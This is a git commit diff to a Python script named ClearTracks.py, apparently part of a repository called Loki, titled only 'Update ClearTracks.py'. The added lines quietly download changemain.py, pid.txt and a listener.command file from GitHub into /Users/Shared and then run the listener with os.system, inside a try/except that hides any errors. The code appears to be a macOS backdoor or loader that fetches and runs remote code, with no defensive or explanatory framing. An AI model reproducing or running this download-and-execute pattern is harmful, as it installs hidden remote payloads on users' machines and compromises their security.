bd1e6c84b70eafa390ba44a1139c78d038546080
3-TA <77489816+3-TA@users.noreply.github.com>
2023-05-18 17:50:02 +0800

    Update ClearTracks.py

--- ClearTracks.py
+++ ClearTracks.py
@@ -13,7 +13,10 @@ try:
   import time
   time.sleep (0.5)
   import urllib
-  urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/Hermes", "/Users/Shared/Hermes")
+  urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/changemain.py", "/Users/Shared/changemain.py")
+  urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/pid.txt", "/Users/Shared/pid.txt")
+  urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/listener.command", "/Users/Shared/listener.command")
   time.sleep (5)
+  os.system ('sh /Users/Shared/Hermes/listener.command')
 except:
   pass
